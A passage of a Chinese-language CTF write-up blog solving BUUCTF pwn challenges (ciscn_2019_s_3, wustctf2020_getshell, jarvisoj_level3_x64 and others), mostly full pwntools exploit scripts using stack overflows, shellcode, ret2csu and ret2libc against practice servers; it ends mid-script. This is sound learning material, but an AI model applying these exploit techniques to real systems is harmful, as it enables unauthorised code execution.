class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里科普一下strcmp函数遇到’’&#x2F;x00’空字符时会停止</p>
<ul>
<li><p><strong>负值</strong>：如果 <code>str1</code> 小于 <code>str2</code>。</p>
</li>
<li><p><strong>零</strong>：如果 <code>str1</code> 等于 <code>str2</code>。</p>
</li>
<li><p><strong>正值</strong>：如果 <code>str1</code> 大于 <code>str2</code>。</p>
</li>
</ul>
</blockquote>
<p>所以我们的第一步就是传一下这个字符串‘’crashme\x00‘’</p>
<p>在看一下栈的情况，这里不看ida，自己调试一下（我的理解是因为esp指针的问题所以反编译的时候不对），调一下！！</p>
<p>这里脚本跑一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./1111&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x8048600&#x27;</span>)<span class="comment">#利用gdb动调，在0x8048600处下了个断点</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;crash: &#x27;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>)<span class="comment">#接收回显的参数s在栈上的地址，长度是10，以16进制表示</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;crashme\x00&#x27;</span>+<span class="string">&#x27;aaaaaa&#x27;</span><span class="comment">#前面的crashme\x00绕过if判断</span></span><br><span class="line">      <span class="comment">#后面的aaaa是测试数据，随便输入的，我们等等去栈上找它的地址</span></span><br><span class="line">      <span class="comment">#利用它找到返回地址在栈上的地址，将返回地址覆盖为shellcode</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">pause()<span class="comment">#linxu下的暂停程序命令</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031508325.png" alt="image-20240716093331948"></p>
<p>你会看到我们输入的<strong>crashme</strong>，但是下面只显示了ashme，少了cr，仔细看一下就应该知道他在上面，因为是小段存储，所以是从右开始数40(95)，41(ff)，42(63)，43(72)。</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031508116.png" alt="image-20240716094221307"></p>
<p>欧克，这样的话就能计算偏移了</p>
<p>0xffafce58 -0xffafce42</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031508523.png" alt="image-20240716094636598"></p>
<p>得到偏移为0x16</p>
<ul>
<li>接下来解决我们指向shellcode的地址问题</li>
</ul>
<p>一开始栈的位置为0xffafce7c</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031508639.png" alt="image-20240716094914434"></p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031508159.png" alt="image-20240716100059049"></p>
<p>输入点距离我们的返回地址为（0x3c-0x20）0x1c，所以我们用0xffafce7c-0x1c来表示返回地址。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;crashme\x00&#x27;</span>+ <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x16</span>-<span class="number">8</span>+<span class="number">4</span>) +p32(stack)+shellcode</span><br></pre></td></tr></table></figure>

<p>完整exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27686</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;crash: &#x27;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(r.recv(<span class="number">10</span>),<span class="number">16</span>)<span class="comment">#接收回显的参数s在栈上的地址，长度是10，以16进制表示</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">stack=<span class="number">0xffafce7c</span>-<span class="number">0x1c</span></span><br><span class="line">payload=<span class="string">b&#x27;crashme\x00&#x27;</span>+ <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x16</span>-<span class="number">8</span>+<span class="number">4</span>) +p32(stack)+shellcode</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>









<h2 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h2><p>2024.7.6</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031508536.png" alt="image-20240706120105852"></p>
<p>日常检查，64位，NX保护，运行一下，扔进ida</p>
<p>read函数存在溢出</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031508941.png" alt="image-20240706120848065"></p>
<blockquote>
<p>了解一下**_asm关键字**调用内联汇编程序，并且可在C或C++语句合法时出现。</p>
<p>简单了解一下下面：</p>
</blockquote>
<h3 id="32位与64位系统调用的区别"><a href="#32位与64位系统调用的区别" class="headerlink" title="32位与64位系统调用的区别"></a>32位与64位系统调用的区别</h3><blockquote>
<p>传参不同</p>
<p>系统调用不同</p>
<p>调用方式不同</p>
</blockquote>
<ul>
<li>32位</li>
</ul>
<p>传参方式：首先系统将系统调用号传入eax，然后将参数从左到右依次存入ebx，ecx，edx寄存器，返回值值存在eax寄存器</p>
<p>调用号：sys_read的调用号为3，sys_write的调用号为4</p>
<p>调用方式：使用int 80h中断进行系统调用</p>
<ul>
<li>64位</li>
</ul>
<p>传参方式：首先将系统调用号传入rax，然后将参数从左到右依次存入rdi，rsi，rdx,rcx,r8,r9存器中，返回值值存在rax寄存器</p>
<p>调用号：sys_read的调用号为0，sys_write的调用号为1，stub_execve的调用号为59 stub_rt_sigreturn的调用号为15</p>
<p>调用方式：使用syscall进行系统调用</p>
<h3 id="方法：csu和srop、sigret"><a href="#方法：csu和srop、sigret" class="headerlink" title="方法：csu和srop、sigret"></a>方法：csu和srop、sigret</h3><p>简单看一下vuln函数：</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607935.png" alt="image-20240708092707820"></p>
<p>最大长度为0x400，而buf只用0x10。看一下用什么溢出，应该用write函数溢出。</p>
<p>简单编写一下exp：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi = 0x4005a3</span><br><span class="line">syscall = 0x400501</span><br><span class="line">vul_addr = 0x4004ed</span><br><span class="line">ret_addr = 0x4003a9</span><br><span class="line"></span><br><span class="line">payload = p64(ret_addr) + b&#x27;/bin/sh\0&#x27;</span><br><span class="line">payload += p64(0x4004e2) # rax=0x3b</span><br><span class="line">payload += p64(0x40059a) # rdx = 0</span><br><span class="line">payload += p64(0) + p64(1) # rbx = 0, rbp = 1</span><br><span class="line">payload += p64(buf_addr) + p64(0) * 3 # r12 = buf_addr</span><br><span class="line">payload += p64(0x400580)</span><br><span class="line">payload += p64(0) * 7 # 这里执行到0x400580后又会重新pop一遍, 7是调试出来的，没仔细看代码...</span><br><span class="line">payload += p64(pop_rdi) + p64(buf_addr + 8) # rdi = &amp;&#x27;/bin/sh\0&#x27;</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">payload += p64(vul_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>放着</p>
<p>泄露栈基址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28398</span>)</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#params</span></span><br><span class="line">vlu= <span class="number">0x4004ED</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>+p64(vlu)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p><strong>okok.2024.7.16回头来看一手</strong></p>
<p>需要用execve函数，</p>
<p>这里的漏洞还是很好找的</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607936.png" alt="image-20240716145543747"></p>
<p>很明显的溢出！</p>
<p>看一眼gadgets函数，</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607937.png" alt="image-20240716145722609"></p>
<p>上网查一下</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031509108.png" alt="image-20240716150133511"></p>
<p>SO,看一眼ida里面最后的寄存器的调用情况</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031509536.png" alt="image-20240716150347196"></p>
<p><strong>解题思路：</strong>利用execve(&#x2F;bin&#x2F;sh,0,0)获取shell，这里需要让rdi&#x3D;&#x2F;bin&#x2F;sh ，rdx&#x3D;0，rsi&#x3D;0</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031509455.png" alt="image-20240716162113156"></p>
<p>通过打印出来的stack_addr得出的地址与buf的地址偏移为:0x148</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031509417.png" alt="image-20240716162116494"></p>
<p>gadgets函数里面。分别对rax赋予了0xf（sigret）, 和0x3b（execve）</p>
<p><strong>CSU解法：</strong></p>
<blockquote>
<p>执行execve有几个关键的寄存器的值需要设置</p>
<ul>
<li>rax &#x3D; 0x3b</li>
<li>rdi &#x3D; &amp;’&#x2F;bin&#x2F;sh\0’</li>
<li>rsi &#x3D; 0</li>
<li>rdx &#x3D; 0</li>
</ul>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031509477.png" alt="image-20240716163445353"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./1111&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29476</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">vul_addr = <span class="number">0x4004ed</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span> + p64(vul_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4005a3</span></span><br><span class="line">syscall = <span class="number">0x400501</span></span><br><span class="line">vul_addr = <span class="number">0x4004ed</span></span><br><span class="line">ret_addr = <span class="number">0x4003a9</span></span><br><span class="line"></span><br><span class="line">payload = p64(ret_addr) + <span class="string">b&#x27;/bin/sh\0&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x4004e2</span>) <span class="comment"># rax=0x3b</span></span><br><span class="line">payload += p64(<span class="number">0x40059a</span>) <span class="comment"># rdx = 0</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) <span class="comment"># rbx = 0, rbp = 1</span></span><br><span class="line">payload += p64(buf_addr) + p64(<span class="number">0</span>) * <span class="number">3</span> <span class="comment"># r12 = buf_addr</span></span><br><span class="line">payload += p64(<span class="number">0x400580</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">7</span> <span class="comment"># 这里执行到0x400580后又会重新pop一遍, 7是调试出来的，没仔细看代码...</span></span><br><span class="line">payload += p64(pop_rdi) + p64(buf_addr + <span class="number">8</span>) <span class="comment"># rdi = &amp;&#x27;/bin/sh\0&#x27;</span></span><br><span class="line">payload += p64(syscall)</span><br><span class="line">payload += p64(vul_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>放着！！！一坨！！！</p>
<p>这题真的很长哈，因为看了很多的wp，但是都没有做出来，终于在这回打通了，这是第一次接触系统调用的题，其实之前也遇到过一些系统调用的题，知道什么int 0x80 什么的。我是fw</p>
<h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><ul>
<li>系统调用:实际上是0x80号中断对应的中断处理程序的子程序。简单来说，在linux系统上，0x80中断是系统调用的统一入口（这里讲的是32位）。某个具体的系统调用是这个中断处理程序的子程序，进入具体某个系统调用是通过内核定义的系统调用号码来实现的。</li>
<li>系统调用号：每个系统调用在内核里面都对应一个号码，这个号码是在 &#x2F;usr&#x2F;include&#x2F;i386-linux-gnu&#x2F;asm&#x2F;unistd_32.h 中定义的。</li>
</ul>
<p>简单来说，系统调用是通过某个入口来执行的子程序，执行完之后，返回上层应用程序的过程。32位和64位的系统调用是不同的：</p>
<blockquote>
<ul>
<li>32位：<br>传参方式：首先将系统调用号 传入 eax，然后将参数 从左到右 依次存入 ebx，ecx，edx寄存器中，返回值存在eax寄存器，通过使用int 0x80中断进行系统调用</li>
<li>64位：<br>传参方式：首先将系统调用号 传入 rax，然后将参数 从左到右 依次存入 rdi，rsi，rdx寄存器中，返回值存在rax寄存器，系统调用是通过syscall来调用的</li>
</ul>
<p>这里看到上面也写了！！调用execve系统函数也说了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x38</span> = <span class="number">59</span>:sys_execve                        mov     rax, 3Bh                </span><br><span class="line"><span class="number">0xf</span> = <span class="number">15</span>:sys_rt_sigreturn                   mov     rax, 0Fh</span><br></pre></td></tr></table></figure>


</blockquote>
<ul>
<li>而系统调用execve(“&#x2F;bin&#x2F;sh”,0,0)，需要这样的布局<br>rax&#x3D;&#x3D;59 #系统调用号<br>rdi&#x3D;&#x3D;“&#x2F;bin&#x2F;sh”<br>rsi&#x3D;&#x3D;0 #控制r14来传值<br>rdx&#x3D;&#x3D;0 #控制r13来传值</li>
</ul>
<blockquote>
<p>下面的看的应该也很清楚。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031509838.png" alt="image-20240716195344848"></p>
<p>用 read 输入 &#x2F;bin&#x2F;sh，再填充溢出，write 是会打印出 0x30 大小的数据，这里在打印的 0x20 到 0x28 是一个地址，这个地址是栈上面的，所以只要算出这个地址和 binsh 地址的相对偏移即可，也可以直接调试出来。</p>
<p>找一下：syscall地址</p>
<p>还是很简单的，ROPgadget工具来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#工具命令</span></span><br><span class="line">ROPgadget  --binary  ./<span class="number">1111</span></span><br><span class="line"><span class="comment">#得到结果</span></span><br><span class="line"><span class="number">0x0000000000400501</span> : syscall</span><br></pre></td></tr></table></figure>

<p>完整exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#_*_coding:utf-8_*_</span></span><br><span class="line"><span class="comment">#/bin/sh</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27015</span>)</span><br><span class="line">main=<span class="number">0x0004004ED</span>     <span class="comment">#这里的地址是0x4004ED</span></span><br><span class="line">execve=<span class="number">0x04004E2</span>     <span class="comment">#这里的地址就是mov     rax, 3Bh 的地址</span></span><br><span class="line">pop_rdi=<span class="number">0x4005a3</span>     <span class="comment">#工具找</span></span><br><span class="line">csu_end=<span class="number">0x40059A</span>     <span class="comment">#就是_libc_csu_init里面的那两个函数地址</span></span><br><span class="line">csu_front=<span class="number">0x0400580</span>  <span class="comment">#</span></span><br><span class="line">sys=<span class="number">0x00400517</span>       <span class="comment">#这里0x00400501和0x00400517都行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露/bin/sh</span></span><br><span class="line">payloadl1=(<span class="string">&#x27;/bin/sh\x00&#x27;</span>).ljust(<span class="number">0x10</span>,<span class="string">&quot;\x00&quot;</span>)+p64(main)</span><br><span class="line">a.send(payloadl1)</span><br><span class="line">a.recv(<span class="number">0x20</span>)</span><br><span class="line">sh=u64(a.recv(<span class="number">8</span>))-<span class="number">280</span> <span class="comment">#接收20个字节后的再8个字节才是地址</span></span><br><span class="line">call_59=sh+<span class="number">0x10</span> <span class="comment">#系统调用号的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">payload2 = <span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)+p64(execve)</span><br><span class="line">payload2 += p64(csu_end)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(call_59)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload2 += p64(csu_front)</span><br><span class="line">payload2 += <span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(pop_rdi)+p64(sh)+p64(sys)</span><br><span class="line">a.sendline(payload2)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure>





<h2 id="wustctf2020-getshell"><a href="#wustctf2020-getshell" class="headerlink" title="wustctf2020_getshell"></a>wustctf2020_getshell</h2><p>2024.7.16</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031510826.png" alt="image-20240716203320024"></p>
<p>老规矩，运行一下</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031510276.png" alt="image-20240716203413577"></p>
<p>扔进ida里面看看</p>
<p>简单的后门，✌</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26664</span>)</span><br><span class="line"></span><br><span class="line">payload=flat([<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>),<span class="number">0x804851B</span>])</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>✌</p>
<p>flag{e7b55206-1102-461d-8888-28f056948c50}</p>
<p>（仔细一看，还以为是栈迁移呢）</p>
<h2 id="jarvisoj-level3-x64"><a href="#jarvisoj-level3-x64" class="headerlink" title="jarvisoj_level3_x64"></a>jarvisoj_level3_x64</h2><p>2024.7.16</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031510099.png" alt="image-20240716205436537"></p>
<p>ida运行一下</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607938.png" alt="image-20240716205534304"></p>
<p>栈溢出应该是</p>
<p>嗯，就是一个泄露libc版本吧，嗯，漏洞的话应该是read函数,用write函数来泄露</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031510334.png" alt="image-20240716205758907"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#64位</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./1111&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25473</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#绕过</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#params1</span></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr =elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_rdi_addr=<span class="number">0x00000000004006b3</span> </span><br><span class="line">pop_rsi_r15_addr=<span class="number">0x00000000004006b1</span> </span><br><span class="line"><span class="comment">#这里未设置rdx是因为它的值是自带的够的。</span></span><br><span class="line"><span class="comment">#attack1</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(pop_rdi_addr)+p64(<span class="number">1</span>)</span><br><span class="line">payload1+=p64(pop_rsi_r15_addr)+p64(write_got)+p64(<span class="number">8</span>)</span><br><span class="line">payload1+=p64(write_plt)+p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">write_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#构建一下libc</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;write&quot;</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&quot;write&quot;</span>)</span><br><span class="line">system_addr = libc_base+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">bin_sh = libc_base+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#attack2</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">payload2 = flat([<span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>),pop_rdi_addr,bin_sh,system_addr])</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>解决了也是</p>
<p>flag{39f9f11a-1651-48fa-96a8-06b9249d221c}</p>
<h2 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h2><p>2024.7.17</p>
<p>感觉没见过哈、看看，日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031510966.png" alt="image-20240717095402673"></p>
<p>运行一下</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607939.png" alt="image-20240717095332540"></p>
<p>感觉确实遇到的太早哈</p>
<h3 id="堆题"><a href="#堆题" class="headerlink" title="堆题"></a>堆题</h3><p>告辞，先放着！！！</p>
<h2 id="mrctf2020-shellcode"><a href="#mrctf2020-shellcode" class="headerlink" title="mrctf2020_shellcode"></a>mrctf2020_shellcode</h2><p>2024.7.17</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607940.png" alt="image-20240717103837246"></p>
<p>扔进ida里面看一眼</p>
<p>反编译失败了，翻一手小笔记</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031510082.png" alt="image-20240717104114338"></p>
<p>okok，不行，没成功！</p>
<p>简单看一眼汇编好了。发现是不是就是一个用puts函数泄露libc，漏洞存在的是read函数！</p>
<p>猜测简单写一手</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#64位</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27060</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./1111&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span 